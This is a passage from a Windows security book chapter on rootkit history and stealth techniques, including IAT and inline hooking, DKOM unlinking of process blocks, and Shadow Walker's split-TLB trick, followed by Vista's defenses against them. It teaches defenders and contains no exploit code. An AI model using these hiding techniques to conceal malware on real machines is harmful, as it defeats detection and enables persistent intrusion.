connections  to  a  specific  IP  address  from  machines  all  over  the  world,  or  perhaps  an  increase  in  the  use  of  a  specific  network  protocol   perhaps  a  P2P  protocol,  or  IRC .  The  system  administrator  for  the  system  would  usually  launch  Task  Manager  or  run  netstat  and  not  find  anything  out  of  the  ordinary; no strange processes in Task Manager would be visible and no strange network  connections would show up in netstat. The servers were almost always running up-to- date antivirus software.  During this time, members of the Microsoft Product Support Services  PSS  security  team were working on tools to detect symptoms of a rootkit, and we had gotten pretty    230   Hacking Exposed Windows: Windows Security Secrets & Solutions   good at identifying one rootkit in particular, Hacker Defender, which seemed to be a  very  popular  rootkit  used  by  various  hacking  groups  or  “crews”  at  the  time.  Hacker  Defender was a good user-mode rootkit, written in Delphi, that emerged on the scene in  2002. It was being continually developed and improved until an official 1.0 release in  January 2004, at which point the author started accepting payment for private versions  of  the  rootkit. A  copy  of  some  versions  of  Hacker  Defender   there  were  many,  many  versions   would  invariably  be  configured  to  hide  folders,  processes,  and  network  connections on the victim machine. The folders that were hidden would be full of pirated  software, movies, and music  often before the movies were even released to theaters ,  and Hacker Defender conveniently allowed the hacking crew to lie to the administrator  about the amount of free space left on the drive  because often they would nearly fill the  drive up with .RAR files and .ISO images of various software programs and movies .  The processes that were being hidden were usually copies of Serv-U FTP or ioFTPD,  which were very popular at the time for hosting warez sites configured to run as the  SYSTEM account. The automated installation scripts  usually just simple batch files  that  would automate the installation of the backdoors, the FTP servers, and the rootkit were  usually running in the context of the all-powerful SYSTEM account. The initial exploit  targeted a vulnerability in an operating system component running as SYSTEM, such as  MS03-026, so the miscreants would have no problem hiding their malware in the System  Volume Information folder—a special system folder hidden off the root of the C: drive  on default installations of Windows. This folder is configured by default, so that only the  SYSTEM account has access. In addition to placing their malware in a difficult to reach  folder  many administrators might not know how to gain access to this folder , attackers  would usually place their malware in a directory structure that made use of reserved  names like NULL, COM1, and AUX, which can be challenging to remove. In fact, this  became  so  common  that  support  engineers  at  Microsoft  wrote  numerous  Knowledge  Base articles to explain to customers how to clean up folders with these reserved names.  Over time, we started to notice a shift in the types of cases we encountered. We would  still get the hacking cases involving universities and various warez crews  COREiSO and  so  on ,  but  every  now  and  then  we  would  get  cases  with  private  institutions,  where  custom malware appeared to be in use. In other words, we would find rootkits that were  not  so  well  known  or  common  on  these  servers,  and  the  goal  of  the  malware  was  definitely to provide covert access without being detected. Interestingly, the way that  these customers usually became aware that something suspicious was happening with  their servers was usually the same as with the other customers from years past: they  would either start to experience stability issues with their operating system  blue screens   that  needed  to  be  debugged  or  the  network  administrators  would  detect  suspicious  flows to IP addresses to which the servers in question should not be talking.  Regarding the blue screens, it turns out that the way in which most rootkits operate  in the kernel makes them susceptible to a variety of bugs that can destabilize the operating  system and cause it to crash in situations where the server has multiple CPUs or is under  heavy  load,  or  both!  Oftentimes,  code  that  may  work  fine  on  a  developer’s  single  processor workstation doesn’t work so well when loaded onto a multiprocessor server  that is under heavy load. The types of servers and the types of institutions being targeted  signaled a shift: the attackers were now no longer interested in simply swapping movies,    Chapter 8:  Achieving Stealth and Maintaining Presence   231  music, and pirated software; they were increasingly going after the data and they didn’t  want to be noticed.  In  2002  and  2003,  as  Microsoft  tackled  the  security  problem  by  releasing  a  more  secure version of its server OS  Windows Server 2003  and started working on a more  secure version of their consumer OS  Windows XP SP2  and moving to a monthly patch  cycle,  the  attackers  started  moving  up  the  stack,  looking  for  other  ways  to  get  their  malware and rootkits on to the system. With many users installing Windows XP SP2 and  having personal firewalls built-in to their home routers, social engineering as a means to  get  malware  installed,  along  with  browser-based  “drive-by”  exploits,  became  more  common.  Possibly as a result of firewalls and automatic updates, and the general drying up of  remote anonymous vulnerabilities targeting system services in Windows, in 2004 Internet  Explorer exploits became increasingly popular as a method for getting malware  and  sometimes rootkits  installed onto victims’ machines. By some estimates, IE users account  for 80 to 85 percent of all Internet browsing traffic, so an exploit that can install malware  via IE  with most users browsing the Web being logged in as administrators  is for all  practical  purposes  as  good  as  or  better  than  the  exploits  that  used  to  target  system  services in the Windows 2000 days  Blaster, Nachi, and so on .  In 2004, a new way of achieving stealth was demonstrated at the Blackhat security  conference  when  James  Butler  presented  a  talk  on  DKOM   Direct  Kernel  Object  Manipulation   and  unveiled  a  new  concept  rootkit  called  FU  that  made  use  of  this  technique  to  hide  user-mode  processes  by  altering  data  objects  in  the  kernel.  The  interesting thing about the approach used by this rootkit is that it doesn’t rely on any  persistent “hooks” or extra code injected into the kernel to achieve stealth. It should be  noted that DKOM is not limited to hiding processes. This technique can be used to hide  device drivers and network ports, and it can even be used to elevate the privilege of  threads! In 2005 this rootkit was added to various bots  like Rbot , making detection and  removal even more challenging for the AV vendors, prompting many such as F-Secure to  investigate creating official anti-rootkit tools like Blacklight.  In  December  2005  Symantec  published  some  startling  findings  in  Virus  Bulletin  regarding the use of DKOM by malware found to be circulating in the wild. The fact that  malware was found in the wild using DKOM techniques wasn’t so startling, however.  What  was  startling  was  that  the  malware  wasn’t  loading  a  device  driver  in  order  to  modify  the  kernel—it  was  operating  entirely  from  user-mode  and  manipulating  the  kernel via \Device\PhysicalMemory. For more information on how this works and for a  good chart illustrating the use of rootkit technology in numerous malware families you  can  read  the  report  at  www.symantec.com avcenter reference when.malware.meets  .rootkits.pdf  In late 2004 and early 2005, a rootkit known as Delprot began getting distributed via  malicious  banner  advertisements  and  websites  that  were  hosting  an  exploit  for  an  IE  vulnerability. The rootkit was interesting because it was a kernel-mode rootkit that was  designed  to  protect  adware   iSearch  toolbar ISPro  adware   that  was  dropped  onto  a  victim’s PC and prevent it from being detected and deleted  delprot.sys was the name of  the kernel device driver, delprot = delete protection?  by various anti-spyware applications.  Interestingly, like a lot of kernel-mode rootkits, this one was unstable and would cause    232   Hacking Exposed Windows: Windows Security Secrets & Solutions   various machines to crash  blue screen  intermittently, which is how people  including  Microsoft   started  to  become  aware  of  this  rootkit.  In  2005,  David  Aucsmith  gave  a  presentation  at  WinHEC   the  Windows  Hardware  Engineering  Conference ,  where  he  showed some alarming statistics about the number of blue screen crashes being caused by  this rootkit  upwards of 140,000 crashes by December 2004 . In May 2005 the Microsoft  Malicious Software Removal Tool  MSRT  had this rootkit and adware family added to  the list of malware that it cleans each month to provide relief to the affected customers.  Many rootkits have the concept of a root  process, which is a process that is immune from the  rootkit’s filtering. A root process can see all the files and processes on a machine, even those being  hidden. In the case of the Delprot.sys rootkit, the IE process  iexplore.exe  was a root process  as it  needed to be able to find the iSearchPro toolbar Browser Helper Objects , so it could “see” the files  on the file system. To remove this malware from a system, all you needed to do was use IE to browse  the file system  instead of Explorer.exe  to rename and or remove the files.  In 2005 at the Blackhat conference in Las Vegas, yet another technique for achieving  stealth was discussed and demonstrated. The approach was implemented in a concept  rootkit  dubbed  Shadow  Walker  by  the  authors  Sherri  Sparks  and  James  Butler.  In  this  presentation, the authors state that most rootkit code and memory patches are sitting  ducks  for  signature-based  virtual  memory  scans  that  know  where  to  look,  and  they  proposed a solution to this problem in the form of Shadow Walker. The authors realized  that by scanning virtual memory, it was rather easy to identify locations that had been  patched or hooked. At Blackhat, they proposed a solution whereby after installing their  own page fault handler, they could return different virtual memory addresses for the  same physical frame of memory depending upon whether an attempt was being made  to read that memory or to execute it! As a result, the technique can be used to hide code  modifications made by malware from detection tools based on virtual memory scans.  Also in 2005, another milestone in achieving stealth on Windows NT–based operating  systems was achieved when researchers at eEye demonstrated a rootkit at Blackhat called  Bootroot. Bootroot was able to load from the Master Boot Record  MBR  of a floppy disk,  CD, or hard drive and persist all the way through the Windows boot process. Imagine  being able to walk up to a Windows NT–based machine, insert a CD into the CD-ROM  drive, press the power button to restart the computer, and as soon as the BIOS attempts  to boot off of the CD  by reading the CD’s MBR , the damage has been done and the  operating system has now had a rootkit installed by the time you see CTRL-ALT-DELETE to  log  in.  This  technique  was  further  refined  by  other  researchers  in  late  2006–2007  and  made to work on prerelease versions of the 32-bit Windows Vista operating system via  the Bootroot rootkit.  At the time of this writing, Bootroot can be mitigated by employing BitLocker Drive Encryption  BDE   on Windows Vista.  BDE  verifies  the  integrity  of  key  files  and  data  structures  required  during  the  Windows boot process and will abort the boot process if tampering is suspected. However, we should  keep in mind that BDE was designed to mitigate the threat of data theft or information disclosure from  stolen or lost systems by preventing data access from an alternative operating system. Therefore, it  should not be concluded that BDE is intended to address all rootkit scenarios in Windows.   Chapter 8:  Achieving Stealth and Maintaining Presence   233  The year 2005 was certainly an explosive one for rootkits, both in terms of growth and  sophistication, and in late 2005, the term rootkit could be considered to have gone mainstream  for the very first time after it was discovered and widely reported by various media outlets  that Sony BMG was distributing a rootkit developed by a company called First 4 Internet  Ltd. on some of its audio CDs to enforce a form of Digital Rights Management  DRM . The  rootkit was discovered by Mark Russinovich after he developed a rootkit detection tool  called Rootkit Revealer. Sony eventually pulled the CDs from the retail channel and the  Sony rootkit was added to the list of rootkits that would be removed by the MSRT.  The year 2006 saw an increase in phishing attacks targeting all manner of institutions,  with the goal of tricking users into typing their personal information into bogus websites  set up to look like legitimate financial institutions. Some of the attacks went even further  than tricking users into revealing their financial information and tried to convince people  to install a new class of malicious software known as banking Trojans, many of which are  now using stealth techniques to make detection and removal more difficult.  In 2006, noted security researcher Joanna Rutkowska presented at various security  conferences  a  proof-of-concept  rootkit  dubbed  Blue  Pill  that  made  use  of  hardware  virtualization extensions found in modern AMD CPUs. This rootkit essentially acted as  a  hypervisor,  or  a  piece  of  software  that  sits  below  the  OS,  allowing  an  attacker  to  effectively treat the installed OS as a virtual machine that could be manipulated by the  rootkit at a lower level than what would normally be allowed on a CPU that did not  support hardware-based virtualization.  At the time of this writing, most system BIOS manufacturers allow virtualization extensions to be enabled  or disabled in the BIOS if the CPU supports this feature. If virtualization support is not needed for running  virtual machines in a product such as Virtual PC or VMWare, it should be disabled in the BIOS.  Also in 2006 a powerful new rootkit was found in the wild that gained some media  attention. Symantec declared that it had found a new advanced rootkit it dubbed Rustock.  Rustock was undetectable by all of the rootkit detection tools that were available at the  time, making detection and removal next to impossible for all but the most advanced  users.  Variants  of  Rustock  targeted  some  of  the  most  popular  rootkit  detection  tools   Blacklight, Rootkit Revealer, IceSword, and GMER . But some of these detection tools  are actively being updated with detection capabilities for new variants of Rustock and  other rootkits. For example, GMER and BlackLight were both capable of detecting many  variants of Rustock. GMER evidently also was one of the few tools that could employ a  cross-view–based  approach  to  scan  alternative  data  streams   it  turned  out  that  many  rootkit  detectors  would  not  examine  the  contents  of  ADSs .  The  creators  of  Rustock  seemed to be monitoring anti-rootkit tools capable of detecting it and security researchers  speaking out about it, and they took measures to prevent these tools from being used, by  launching distributed denial of service  DDoS  attacks against the sites where information  on Rustock was posted and where GMER could be downloaded  possibly using machines  infected with the Rustock rootkit! . According to Joe Stewart’s blog, this rootkit is being  used to hide and protect spambots and spam mass mailers that are generating money via  scams such as stock “pump and dumps,” so it is likely the authors of Rustock are simply  trying to protect their revenue stream. It may also partially explain the increase in this  type of spam observed in 2006 and 2007.   234   Hacking Exposed Windows: Windows Security Secrets & Solutions   As advanced as Rustock is, newer rootkits like Unreal.A have already appeared on  the scene; its authors claim it uses more advanced techniques than Rustock to achieve  stealth. The impact of this rootkit and its techniques remain to be seen. Interestingly, the  authors of this demo rootkit also produce a detection tool for it and other rootkits called  Rootkit Unhooker. The Unreal rootkit and the Rootkit Unhooker tool can be obtained at  www.rku.xell.ru ?l=e&a=dl.  Many advanced kernel-mode rootkits install a device driver and can be detected by simply enabling  boot logging, which can be enabled using msconfig.exe on all versions of Windows. This diagnostic  mode of Windows requires a restart, but it creates a list of all of the drivers that get loaded to a file  called ntbtlog.txt in the %SYSTEMROOT% folder. You could scan the ntbtlog.txt and compare the list  of drivers that got loaded with what the OS actually thinks is loaded once it has finished booting—any  discrepancies should be investigated!  In  2007,  a  pair  of  security  researchers  demonstrated  a  new  bootkit  at  a  security  conference called Hack In The Box  HITB . This rootkit builds on the concept pioneered  by eEye’s Bootroot rootkit discussed earlier, but it has some key differences. One big  difference is that this rootkit works on Vista  only the 32-bit version at the time of this  writing, and only prerelease builds , and the code that gets executed in the kernel doesn’t  serve as a network backdoor; instead, it serves simply to elevate the privilege of CMD  .EXE at a periodic interval.  To achieve this, the code in the kernel modifies special kernel  structures called EPROCESS blocks, which are kernel structures backing each user-mode  process.  Another difference is that this rootkit doesn’t modify or alter the MBR of the  primary hard disk, so it is an example of a nonpersistent rootkit that leaves no disk- based forensic evidence behind once the machine is rebooted  save for possibly any code  that happens to get paged out to the pagefile.sys . The steps to install and activate the  rootkit are still the same as those for bootroot and probably other eventual bootkits based  on  this  technique—the  attacker  needs  the  ability  to  restart  the  victim’s  machine  and  make it boot off either a CD or a PXE device installed on the network.  You can attempt to mitigate these types of threats. Configuring a machine to boot only off of the hard  drive as the first boot device and then password-protecting access to the BIOS goes a long way  toward mitigating these attacks  imagine a co-worker in your office rebooting your machine from a CD  while you are away getting coffee . However, there are well-known ways to get around BIOS passwords  if physical access can be obtained for a longer period of time or if the attacker is willing to crack open  the case. Fortunately the System Integrity team at Microsoft working on Vista’s implementation of full  volume encryption  BitLocker Drive Encryption, or BDE  anticipated exactly these types of threats. As  a result, if you configure BDE on a machine that is equipped with a TPM 1.2 module, the BIOS and  the OS are able to work together to detect attempts at tampering with the boot process with the result  being that the TPM 1.2 module will not give the OS access to the Volume Master Key  VMK  used to  decrypt the Full Volume Encryption Key, which is used to encrypt the volume, when it detects an  attempt to interfere with the startup of the operating system. See “References and Further Reading”  for more detailed information on how machines equipped with a TPM 1.2 module, Vista, and BDE  mitigate these attacks.   Chapter 8:  Achieving Stealth and Maintaining Presence   235  In late 2006 and early 2007, a series of targeted attacks  sometimes referred to as spear phishing  involving malformed Microsoft Office documents were reported. When opened,  these documents would result in code of the attacker’s choice running in the context of  the logged-on user. If these malformed Office documents were opened by a victim logged  in with Administrator rights, he or she would usually unknowingly install a backdoor  and a rootkit on the system as soon as the document was opened. How many users, let  alone  IT  administrators,  would  suspect  that  opening  a  simple  Excel  spreadsheet,  PowerPoint presentation, or Word document they received via e-mail could result in the  box being completely compromised with sophisticated stealth software?  At the time of this writing, Microsoft had released 15 bulletins between the period of  March 2006 and March 2007 affecting Office 2003 products, many of them rated with a  severity rating of important, and some of which had corresponding advisories released  indicating that Microsoft was aware of limited targeted attacks being used that exploited  some new previously unknown vulnerability.  These  attacks  highlight  the  importance  of  least  privilege.  Much  of  the  malware  involved  in  these  attacks requires administrative rights. Running as a standard user would have prevented many of the  techniques used by the malware to achieve persistence and stealth, which would have made detection  and cleanup much easier for the affected user or first responders.  ACHIEVING STEALTH: MODERN TECHNIQUES  In this section, we attempt to enumerate and describe some of the most commonly used  techniques modern rootkits are using to achieve stealth on Windows. This discussion  does not thoroughly document the myriad, near limitless methods that can be used to  achieve stealth, as such a discussion would likely require an entire book or an ongoing  series of books.  Before  discussing  the  ways  in  which  rootkits  achieve  stealth,  we  need  to  cover  “Windows Operating System Internals 101.” The information that follows is a high-level  overview of how an application running in user mode interacts with the kernel, and it is  intended to serve as a foundation on which to build a discussion of techniques used by  various  rootkits  to  achieve  stealth.  For  a  more  comprehensive  understanding  of  how  Windows works “under the metal,” refer to Microsoft Windows Internals 4th Edition, by  Russinovich and Solomon.  Windows Internals  If you were to step back and think about the contents of your operating system’s address  space in both virtual and physical memory, you would probably be able to classify all of  the bytes in memory into one of two categories: data or code. Data refers to the bytes in  memory that are not intended to be executed. It refers to parts of memory that contain  everything from key kernel data structures to the bytes in memory backing the contents    236   Hacking Exposed Windows: Windows Security Secrets & Solutions   of  this  Word  document  being  typed.  Data  is  typically  contained  in  special  regions  of  memory usually referred to as a heap, stack, or pool. Code bytes contain the executable  machine code that your CPU is actually processing to perform work.  Modern  Windows-based  rootkits  all  achieve  stealth  by  tampering  with  bytes  in  memory to alter the way the operating system behaves or the way that it presents data  to the user. Since these bytes fall into one of the two categories mentioned, you can think  of rootkits that operate on either the code bytes or the data bytes  or possibly a combination  of both . The act of modifying code bytes or data bytes is commonly referred to as patching memory.  Windows uses processor access modes to implement a separation between the operating  system kernel and the applications running on top of the operating system. These two  modes of operation are referred to as user mode and kernel mode. You’ll often hear people  referring to ring 0, which is privilege level 0 on x86 CPUs. This is the privilege level of the  CPU used by Windows when it is running in kernel mode. Ring 3 refers to privilege level  3 on x86 CPUs, and as you might have guessed, this is where user mode applications  such as Notepad, Internet Explorer, and your shell all run. When the CPU is operating at  privilege  level  0   kernel  mode ,  it  has  access  to  all  processor  registers  and  all  system  memory. When the CPU is operating at privilege level 3  user mode  it allows access to  memory accessible only from user mode. Since code that is running “in the kernel” has  access to all CPU registers and all system memory, this makes it an attractive target for  rootkit authors, and many consider rootkits that operate in kernel mode to be the most  powerful and insidious types of threats.  Now suppose you wanted to list all of the running processes on Windows. You would  probably use Task Manager to accomplish this. Task Manager runs in user mode but the  list of running processes is information that is tracked by code running in the kernel and  stored in kernel data structures. So to obtain the list of running processes, Task Manager  calls a function exported by NTDLL.DLL named NTQuerySystemInformation. This  function performs a transition into kernel mode by calling a small stub function after  moving the number of the kernel-mode service to call into a CPU register. The small stub  function then uses the CPU’s syscall sysenter instruction  or an INT 2E on older  processors  that  don’t  support  the  syscall sysenter  instruction   to  perform  the  transition into kernel-mode. In the kernel, a system service dispatcher routine receives  the call and looks up the address of the requested system service to call from a kernel  structure called the System Service Descriptor Table  SSDT . The SSDT contains descriptors  that are translated into the addresses in the kernel memory space where these kernel- mode functions can be found. The appropriate kernel-mode function  sometimes referred  to the Windows Native API  is then called after being looked up and decoded in the SSDT.  This  process  is  illustrated  in  Figure  8-1,  which  shows  how  a  user-mode  application  typically accesses files. In the figure, each arrow or box represents a place for a rootkit to  alter the flow of execution and thus to subvert the normal execution of the operating  system.   Chapter 8:  Achieving Stealth and Maintaining Presence   237  Figure 8-1  File access, from user mode to kernel mode  Now before a function like CreateFileW   can be called in KERNEL32.DLL, as  shown in Figure 8-1, it must first be imported by an application, meaning that the DLL  that contains the function to be called must first be loaded into the application’s address  space  in  virtual  memory  and  listed  in  a  table  called  the  Import  Address  Table.  This  represents  another  opportunity  for  a  rootkit  to  subvert  the  normal  flow  of  execution  within a process not depicted in Figure 8-1.  In Figure 8-2 we see the normal flow of execution that occurs when code in a process   attempts to call an imported function.   238   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 8-2  Normal Import Address Table lookup  no hooking   Figure  8-3  depicts  how  rootkit  code  injected  into  a  process  can  interfere  with  the   process of resolving imported functions to detour the flow of execution.  Another common method used for altering the flow of code execution in user mode  is sometimes referred to as inline  function  patching or “inserting a trampoline.” In this  technique, the rootkit actually patches, or modifies, the first few bytes of the function to  be detoured. This is usually done so that the rootkit is able to filter the data being returned  by the function to, for example, remove a file from a list of files contained in a directory  to hide it from the application attempting to list files.   Chapter 8:  Achieving Stealth and Maintaining Presence   239  Figure 8-3  Hooked Import Address Table lookup  Figure 8-4 shows the normal flow of execution as an application attempts to use the  FindFirstFile   FindNextFile   APIs  exported  by  KERNEL32.DLL  to  list  the  contents  of  a  folder  on  the  hard  drive.  These  APIs  end  up  calling  the  imported  NtQueryDirectoryFile    function   from  NTDLL.DLL ,  which  then  takes  care  of  transitioning to kernel mode. Now, because the NtQueryDirectoryFile API returns information about a file in  a folder, this would be a good API to hook if you wanted to ensure that files remain  hidden from user-mode APIs that call it.   240   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 8-4  Listing ﬁ les in a folder  Figure 8-5 shows how Hacker Defender 1.0, a common user-mode rootkit, hides files   by hooking the NtQueryDirectoryFile API.  Inline  function  patching  and  Import  Address  Table   IAT   hooks  are  arguably  the  most common methods used by user-mode rootkits to achieve stealth. Now let’s have a  look at some of the techniques being used to subvert the kernel.  DKOM  To  help  you  understand  how  rootkits  that  make  use  of  this  technique  work,  a  bit  of  background  on  how  Windows  works  is  needed.  Windows  user-mode  processes  are  backed  by  kernel-mode  objects  known  as  executive  process   EPROCESS   blocks.  An  EPROCESS block is a structure in memory that contains information about a user-mode  process. For example, an EPROCESS block for a process contains information about that  process’s creation time, the token that the process is using, and a variety of other things.    Chapter 8:  Achieving Stealth and Maintaining Presence   241  Figure 8-5  Hiding ﬁ les in a folder with an inline function patch  The EPROCESS structures for all the running processes are organized in a doubly-linked  list: each EPROCESS structure points to another structure  LIST_ENTRY , which contains  pointers to the next EPROCESS structure  FLINK  and the previous EPROCESS structure   BLINK .  Once  the  rootkit  code  has  located  these  pointers  in  a  given  LIST_ENTRY  structure,  it’s  a  fairly  trivial  exercise  to  follow  these  pointers  in  a  loop  until  you’ve  identified an EPROCESS structure that backs a process that you wish to hide or alter and  to  rearrange  the  forward  and  backward  link  pointers  to  unlink  the  target  processes  EPROCESS  block.  Figure  8-6  depicts  the  unlinking  of  the  EPROCESS  structure,  highlighted in the circle by changing the EPROCESS block to which its back  BLINK   and forward  FLINK  pointers point.   242   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 8-6  EPROCESS block structure  You might assume that after “orphaning” an EPROCESS block backing a user-mode  process by manipulating the FLINK and BLINK pointers contained in its LIST_ENTRY  structure that the user-mode process would no longer run—but, in fact, it does! This is  because Windows schedules a process’s threads for execution on a CPU, and it turns out  that a process’s threads continue to be scheduled even when the process’s EPROCESS  block is no longer in the doubly-linked list of running processes.  The FU rootkit is also able to hide drivers by applying a similar technique to the linked list of drivers in  the kernel, which can also be navigated and manipulated by following FLINK and BLINK pointers in  LIST_ENTRY structures. After fixing up the pointers, the driver can unload and the file can even be  deleted from the disk, leaving very little forensic evidence.   Chapter 8:  Achieving Stealth and Maintaining Presence   243  In 2006, a revised version of FU called FUTo was announced by the authors in an  online journal on Uninformed.org. This version of FU could hide processes in a way that  would allow them to remain undetected by popular  at the time  rootkit detection tools  such as Blacklight and IceSword. You can read more about FUTo at www.uninformed  .org ?v=3&a=7&t=sumry. FUTo’s help is shown here: C:\FUTo\EXE>fu  ?

To learn more about the structures mentioned here refer to Chapter 6 in Microsoft Windows Internals,  4th Edition. To learn more about how the FU rootkit modifies these structures, refer to Chapter 7 in  Rootkits: Subverting the Windows Kernel.

Shadow Walker  The method used by this rootkit to lie about the contents of virtual memory depends on  being  able  to  decouple  the  data  and  instruction  translation  lookaside  buffers   TLBs   common on modern processors, along with installing a new custom page fault handler.  A TLB is a processor cache designed to speed up virtual to physical address translation.  When you access a memory address in a Windows program, you are actually accessing  a virtual memory address located in a page of virtual memory. This address must then be  translated to a frame of physical memory through a rather complicated process known as  address translation. The TLBs are a high-speed cache of these virtual to physical address  mappings.  Two  TLBs  are  actually  involved:  one  for  pages  of  memory  containing    246   Hacking Exposed Windows: Windows Security Secrets & Solutions   instructions  the ITLB  and one for pages of memory containing data  the DTLB . When  referencing  memory  that  cannot  be  resolved  via  the  TLB,  a  page  fault  occurs,  which  causes the virtual memory manager to bring the page from the paging file into physical  memory.  When Shadow Walker is installed, it immediately installs a new page fault handler  and then flushes the TLBs, which forces all attempts to locate a page of virtual memory  to go through the newly installed page fault handler. At that point, Shadow Walker code  is able to intercept attempts to access all pages of memory  via the new page fault handler   and is then able to determine whether the attempt to access memory is being made to  execute the page of memory  to execute rootkit code, for example  or simply to read the  page of memory  to scan the page of memory looking for rootkit code . If an attempt is  being made to read a page of memory that the attacker wishes to hide  that is, a page that  has been hooked or a page that contains rootkit code , Shadow Walker could “fix up” the  DTLB to have it return the “original” unhooked copy of the page of memory  or a garbage  page of memory if an attempt is being made to read pages of memory containing the  actual rootkit . If an attempt is being made to execute code in a page of memory that has  been hooked or that belongs to the rootkit, Shadow Walker populates the ITLB with the  appropriate frame of memory belonging to the rootkit, and the code is then executed. In  essence, Shadow Walker makes use of split TLBs, meaning that different virtual memory  addresses are returned for a given physical frame of memory depending on whether an  attempt is being made to read that page or to execute it.  Due to the methods used by this form of stealth, it is not possible for it to hide or lie about the pages  of memory backing the newly installed page fault handler. Therefore, inspecting the operating systems  page fault handler should be enough to detect this rootkit.  For more information on Shadow Walker, refer to Phrack 63: www.phrack.org archives 63 p63-0x08_ Raising_The_Bar_For_Windows_Rootkit_Detection.txt.  ANTIVIRUS SOFTWARE VS. ROOTKITS  Historically, antivirus software has not had a good track record when it comes to detecting  and, more important, removing modern stealth software. An antivirus software is, after  all,  just  another  application  installed  on  top  of  the  operating  system—an  operating  system the rootkit can control. As a result, the various AV vendors tend to fall into one of  three categories when it comes to detecting a particular stealth software:     It can neither detect nor remove stealth software once the stealth software is   running. A good example of this is the Rustock rootkit that many AV vendors  were neither able to detect nor clean even in early 2007, many months after its  discovery.   Chapter 8:  Achieving Stealth and Maintaining Presence   247     It can detect but can’t remove the stealth software once it is running.    It can detect and can remove the stealth software once it is running. A good  example of this is the infamous Sony BMG First4Internet rootkit that is now  able to be detected and removed by AV vendors and the Microsoft Malicious  Software Removal Tool as well as many versions of the Hacker Defender rootkit.  Oftentimes, if the user is able to disable the rootkit  by stopping a hidden driver or  renaming the driver if it’s not hidden , the AV software may then be able to identify the  various components involved in the intrusion and clean remove them.  Since  rootkits  can  hide  files  only  while  they  are  active,  one  approach  to  detecting  rootkits  using  signature- or heuristic-based AV scanners is to mount the suspect drive from a known-good clean  operating system and use antivirus software on this known-good image to scan the suspect volume  while it is offline  that is, not booted into the OS installed on the volume . Another less reliable but  probably still effective approach would be to scan a suspected compromised machine across the  network by mapping its drives and scanning them from a known-good OS. A kernel-mode rootkit could  easily filter the list of files and folders being sent to the remote OS, but user-mode rootkits like Hacker  Defender and others will not be able to hide from remote file scans.  WINDOWS VISTA VS. ROOTKITS  Windows Vista offers many security and safety improvements that impact the ability of  modern rootkits to operate effectively, even if a user attempts to run them. Some of the  security features apply to both 32-bit and 64-bit versions of Vista, while other features  apply only to 64-bit versions of Vista.  Kernel Patch Protection  KPP : Patchguard  In 2006, as Microsoft was preparing to release Vista, several antivirus vendors voiced  objection to the planned inclusion of a key technology present in 64-bit versions, dubbed  Kernel Patch Protection  KPP . KPP is watchdog code, which was first introduced in 64-bit  versions of Windows Server 2003 SP1 and 64-bit versions of Windows XP more than a  year earlier, with little fanfare. KPP code examines key kernel data structures and APIs  for signs of tampering and takes action if tampering is detected.  Scott Field, a kernel  security software architect at Microsoft, describes the common motives for patching the  kernel and the results that can occur as a result of this in a blog post at http:  blogs  .msdn.com windowsvistasecurity archive 2006 08 11 695993.aspx.   In  short,  KPP  was  developed  to  prevent  software   both  legitimate  and  malicious   from altering the kernel and intends to improve overall system security, stability, and  reliability by encouraging application vendors to use supported and documented APIs  and to prevent malware from using these techniques. When tampering is detected, KPP    248   Hacking Exposed Windows: Windows Security Secrets & Solutions   initiates a bugcheck to bring down the operating system to alert the user and prevent the  software from taking further action. KPP is present only on x64 versions of Windows due  to the “fresh start” afforded by this new architecture and the lack of legacy software that  would be affected by this new feature. Still, the inclusion of this technology in Vista was  seen as a controversial move by some AV vendors who saw their existing software suites  catastrophically broken by this policy. These vendors believed that this technology would  be trivial for motivated attackers to circumvent, while preventing a plethora of legitimate  AV IDS and IPS software from functioning on this platform. One vendor, Athentium,  even went so far as to write proof-of-concept code that demonstrated a technique for  bypassing Patchguard—a technique that was subsequently blocked in the release version  of Windows Vista.  Since Vista’s release, Microsoft has committed to working with the AV and security  product vendors to address their concerns and to help them work within the framework  of KPP. Microsoft has also committed to responding to attempts to bypass or subvert  KPP and will issue updates through Windows Update to improve the resiliency of this  code as needed.  At the time of this writing, we are not aware of any 64-bit rootkits for Windows Vista   with the exception of the Blue Pill hypervisor-based rootkit , nor of any ways to disable  KPP successfully, although interesting research has been conducted in this area.  For  a  more  detailed  analysis  of  KPP  and  in-depth  writeups  of  previous  attempts  to  bypass  its  protections, refer to the articles at www.uninformed.org.  UAC: You’re About to Get 0wn3d, Cancel or Allow?  In Windows XP, the default account type created during setup was an Administrator  account. If you wanted to log in as a regular user on a day-to-day basis, you had to go  out of your way to create a non-Administrator account. The result is that the vast majority  of users run as Administrator at all times. Rootkits and most malware take full advantage  of this situation to modify systemwide auto-start Registry settings  for persistence across  reboots , inject malicious code into SYSTEM processes, place files in important folders,  and perform other misdeeds.  In Windows Vista, the default account type created during setup is still Administrator,  but it’s a protected Administrator account—protected by User Account Control  UAC .  With UAC enabled  the default , when an Administrator logs in, she gets what amounts  to a standard user token. This means that software launched with this type of token also  runs  with  standard  user  rights.  As  a  standard  user,  you  can’t  inject  code  into  other  processes at higher privilege or integrity level. You also can’t modify many systemwide  Registry settings in HKEY_LOCAL_MACHINE  HKLM , and you can’t write files to folders  like those under \Windows or \Program Files. And perhaps most importantly, you can’t  load arbitrary device drivers into the kernel. When UAC is enabled, these actions all  require elevation, which involves adding removed Administrator level privileges back to  the  process  token  and  running  it  at  a  higher  integrity  level   High  versus  Medium  integrity .   Chapter 8:  Achieving Stealth and Maintaining Presence   249  For  additional  information  on  UAC  and  integrity  levels  in Vista,  see  http:  technet2.microsoft.com  WindowsVista en library 00d04415-2b2f-422c-b70e-b18ff918c2811033.mspx?mfr=true.  Following  is  the  output  of  attempting  to  run  FUTo  from  a  command  prompt   unelevated   on  Windows  Vista  32-bit  with  UAC  enabled  while  logged  in  as  a  local  Administrator: C:\FUTo\FUTo_enhanced\FUTo\EXE>fu  ? Unable to Load DriverThe system cannot find the file specified.  Failed to initialize driver.  C:\FUTo\FUTo_enhanced\FUTo\EXE>  For this particular EXE, the user isn’t even prompted to elevate; the loader simply fails  to load and subsequently start the device driver with the net result being the user was  protected. Running FU from an elevated command prompt on 32-bit Vista results in an  entirely different experience, as shown in Figure 8-10.  Figure 8-10  Vista Ultimate 32-bit versus FUTo   250   Hacking Exposed Windows: Windows Security Secrets & Solutions   Secure Startup  Now to be fair, all this indicates is that after elevation, the FUTo driver  msdirectx  .sys  was indeed loaded but needs to be updated to work properly on Windows Vista   which probably involves little more than fixing up the offsets to some structures that  FUTo 